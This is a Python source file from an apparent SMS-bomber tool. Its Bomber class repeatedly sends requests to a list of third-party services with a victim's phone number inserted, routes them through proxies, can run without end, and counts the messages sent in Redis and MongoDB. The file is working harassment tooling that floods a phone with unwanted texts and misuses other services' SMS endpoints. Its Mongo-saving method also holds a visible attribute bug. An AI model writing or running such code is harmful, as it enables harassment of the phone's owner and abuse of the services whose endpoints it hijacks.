from src.bomber.services import SERVICES, proxies
from src.bomber.phone_number import paste_phone_number_to_json

from src.users.models import User
from src.redis_ import redis

from typing import Union
from datetime import datetime, timedelta

import requests
import asyncio


class CountSms:
    def __init__(self, user_id):
        self.user_id = user_id

    def save_count_sent_sms_to_redis(self, count):
        """ 
            Save in radis for those temporary data,
            and so as not to load mongodb.
        """
        if (current_count_sms := redis.get(self.user_id)):
            redis.set(self.user_id, int(current_count_sms)+count)
        else:
            redis.set(self.user_id, count)

    def save_count_sent_sms_to_mongo(self):
        """ Save result count, to mongo """
        user = User.objects.get(user_id=self.user_id).count_sent_sms
        if user.count_sent_sms == 0:
            user.count_sent_sms = redis.get(self.user_id)
        else:
            sum_count_sms = user.count_sent_sms + redis.get(self.user_id)
            user.count_sent_sms = sum_count_sms
        redis.delete(self.user_id)
        user.save()


class Bomber:
    def __init__(
            self,
            phone_number: str,
            count_services: Union[int, str],
            delay: int,
            end_time_in_minutes: Union[int, str],
            save_count_sms: CountSms
    ):
        self.save_count_sms = save_count_sms
        self.phone_number = phone_number
        self.delay = delay

        if isinstance(count_services, int):
            self.end_time_in_minutes: datetime = datetime.utcnow() + timedelta(
                minutes=int(
                    end_time_in_minutes
                )
            )
        else:
            self.end_time_in_minutes: str = end_time_in_minutes

        if isinstance(count_services, str) and count_services == 'all':
            self.count_services = SERVICES
        else:
            self.count_services = SERVICES[:count_services]
        self.stopped = False

    async def run(self):
        while not self.stopped:
            if self.end_time_in_minutes != 'inf':
                if datetime.utcnow() > self.end_time_in_minutes:
                    return self.save_count_sms.save_count_sent_sms_to_mongo()

            for service in self.count_services:
                paste_phone_number_to_json(service, self.phone_number)

                if service.method == 'POST':
                    requests.post(
                        url=service.url,
                        json=service.json,
                        data=service.data,
                        params=service.params,
                        headers=service.headers,
                        proxies=proxies
                    )
                if service.method == 'GET':
                    requests.get(
                        url=service.url,
                        json=service.json,
                        data=service.data,
                        params=service.params,
                        headers=service.headers,
                        proxies=proxies
                    )
            self.save_count_sms.save_count_sent_sms_to_redis(len(self.count_services))
            await asyncio.sleep(self.delay)
